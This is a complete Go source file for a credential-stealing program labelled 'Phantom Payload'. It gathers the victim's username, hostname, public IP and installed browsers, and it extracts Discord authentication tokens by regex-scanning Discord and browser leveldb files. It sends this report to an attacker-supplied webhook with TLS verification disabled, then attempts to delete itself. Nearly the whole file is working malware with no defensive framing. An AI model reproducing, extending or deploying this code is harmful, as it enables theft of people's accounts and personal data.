package main

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"os"
	"os/user"
	"path/filepath"
	"regexp"
	"runtime"
	"strings"
	"time"
)

// Injected via ldflags
var (
	WebhookURL string
	Timestamp  string
)

type SystemReport struct {
	Username  string   `json:"username"`
	Hostname  string   `json:"hostname"`
	OS        string   `json:"os"`
	Arch      string   `json:"arch"`
	CPUs      int      `json:"cpus"`
	PublicIP  string   `json:"public_ip"`
	Tokens    []string `json:"tokens"`
	Browsers  []string `json:"browsers_found"`
	Timestamp string   `json:"timestamp"`
}

func main() {
	if WebhookURL == "" {
		return
	}

	report := gatherEverything()
	sendReport(report)

	// Self-delete
	defer os.Remove(os.Args[0])
}

func gatherEverything() SystemReport {
	currUser, _ := user.Current()
	hostname, _ := os.Hostname()

	report := SystemReport{
		Username:  currUser.Username,
		Hostname:  hostname,
		OS:        runtime.GOOS,
		Arch:      runtime.GOARCH,
		CPUs:      runtime.NumCPU(),
		PublicIP:  getPublicIP(),
		Timestamp: Timestamp,
	}

	report.Tokens = extractDiscordTokens()
	report.Browsers = findBrowsers()

	return report
}

func getPublicIP() string {
	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Get("https://api.ipify.org")
	if err != nil {
		return "Unknown"
	}
	defer resp.Body.Close()
	ip, _ := io.ReadAll(resp.Body)
	return string(ip)
}

func findBrowsers() []string {
	var found []string
	home, _ := os.UserHomeDir()

	paths := map[string]string{
		"Chrome":  filepath.Join(home, "AppData", "Local", "Google", "Chrome"),
		"Edge":    filepath.Join(home, "AppData", "Local", "Microsoft", "Edge"),
		"Brave":   filepath.Join(home, "AppData", "Local", "BraveSoftware", "Brave-Browser"),
		"Opera":   filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera Stable"),
		"Firefox": filepath.Join(home, "AppData", "Roaming", "Mozilla", "Firefox"),
	}

	for name, path := range paths {
		if _, err := os.Stat(path); err == nil {
			found = append(found, name)
		}
	}
	return found
}

func extractDiscordTokens() []string {
	var tokens []string
	home, _ := os.UserHomeDir()

	paths := []string{
		filepath.Join(home, "AppData", "Roaming", "Discord", "Local Storage", "leveldb"),
		filepath.Join(home, "AppData", "Roaming", "DiscordCanary", "Local Storage", "leveldb"),
		filepath.Join(home, "AppData", "Roaming", "DiscordPTB", "Local Storage", "leveldb"),
		filepath.Join(home, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),
		filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera Stable", "Local Storage", "leveldb"),
	}

	re := regexp.MustCompile(`[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}`)

	for _, path := range paths {
		files, err := os.ReadDir(path)
		if err != nil {
			continue
		}

		for _, file := range files {
			if !strings.HasSuffix(file.Name(), ".log") && !strings.HasSuffix(file.Name(), ".ldb") {
				continue
			}

			content, err := os.ReadFile(filepath.Join(path, file.Name()))
			if err != nil {
				continue
			}

			matches := re.FindAllString(string(content), -1)
			for _, match := range matches {
				if !contains(tokens, match) {
					tokens = append(tokens, match)
				}
			}
		}
	}
	return tokens
}

func contains(slice []string, item string) bool {
	for _, s := range slice {
		if s == item {
			return true
		}
	}
	return false
}

func sendReport(report SystemReport) {
	// Create JSON data
	data, _ := json.MarshalIndent(report, "", "  ")

	// Prepare multipart form
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	// Add embed part (simplified for the file approach)
	part, _ := writer.CreateFormField("payload_json")
	embedJSON := map[string]interface{}{
		"content": "👻 **Phantom Payload - Full Report**",
		"embeds": []map[string]interface{}{
			{
				"title": "System Summary",
				"color": 0xff0000,
				"fields": []map[string]interface{}{
					{"name": "User", "value": fmt.Sprintf("`%s`", report.Username), "inline": true},
					{"name": "IP", "value": fmt.Sprintf("`%s`", report.PublicIP), "inline": true},
					{"name": "Tokens Found", "value": fmt.Sprintf("`%d`", len(report.Tokens)), "inline": true},
				},
			},
		},
	}
	payloadJSON, _ := json.Marshal(embedJSON)
	part.Write(payloadJSON)

	// Add the full data as a file
	filePart, _ := writer.CreateFormFile("file", "report.json")
	filePart.Write(data)
	writer.Close()

	// Send request
	req, _ := http.NewRequest("POST", WebhookURL, body)
	req.Header.Set("Content-Type", writer.FormDataContentType())

	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	client.Do(req)
}
